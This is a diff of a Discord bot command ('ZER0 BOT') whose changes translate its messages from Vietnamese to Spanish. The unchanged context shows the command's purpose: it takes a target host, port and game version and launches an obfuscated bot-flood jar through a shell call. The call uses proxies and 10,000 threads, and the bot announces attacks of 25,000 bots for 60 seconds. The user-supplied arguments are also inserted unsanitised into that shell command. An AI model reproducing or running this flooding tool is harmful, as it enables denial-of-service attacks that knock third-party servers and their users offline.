@@ -15,8 +15,8 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('CẢNH BÁO')
-	.setDescription("`Mẫu ;antibot 1.1.1.1 25565 47`")
+	.setTitle('⚠️ ADVERTENCIA')
+	.setDescription("`Formato ;antibot 1.1.1.1 25565 47`")
 	message.channel.send(embed1);
 	return;
 	}
@@ -24,8 +24,8 @@ if(!args[0]) {
 if(!args[1]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('CẢNH BÁO')
-	.setDescription("`Yêu cầu ghi Cổng`")
+	.setTitle('⚠️ ADVERTENCIA')
+	.setDescription("`Se requiere especificar el Puerto`")
 	message.channel.send(embed1);
 	return;
 	}
@@ -33,8 +33,8 @@ if(!args[1]) {
 if(!args[2]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('CẢNH BÁO')
-	.setDescription("`Yêu cầu ghi phiên bản`")
+	.setTitle('⚠️ ADVERTENCIA')
+	.setDescription("`Se requiere especificar la versión`")
 	message.channel.send(embed1);
 	return;
 	}
@@ -43,14 +43,14 @@ var exec = require('child_process').exec
 exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=proxies.txt threads=10000 method=nantibot version=${protocol} license=123ascqweq11`, (error, stdout, stderr) => {
 });
 setTimeout(function(){ 
-    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)
+    console.log('Ataque detenido ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**► Cuộc tấn công đã dừng lại 💥**")
+	.setDescription("**► ¡Ataque finalizado 💥**")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setThumbnail("")
@@ -58,14 +58,14 @@ const embed = new Discord.MessageEmbed()
  }, 120000); //time in milliseconds
 var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
     var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
-console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
+console.log('Iniciando ataque ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**Người Dùng**: `" + message.author.username + "` \n **Máy Chủ**: `" + host + "` \n **Cổng**: `" + port + "` \n **Phiên Bản**: `" + protocol + "`\n \n **Phương pháp**: `nAntiBot 💥` \n **Số lượng Bot**: `25.000 🚀` \n **Thời gian**: `60 giây 🕒`")
+	.setDescription("**Usuario**: `" + message.author.username + "` \n **Servidor**: `" + host + "` \n **Puerto**: `" + port + "` \n **Versión**: `" + protocol + "`\n \n **Método**: `nAntiBot 💥` \n **Cantidad de Bots**: `25.000 🚀` \n **Tiempo**: `60 segundos 🕒`")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(randomgif)
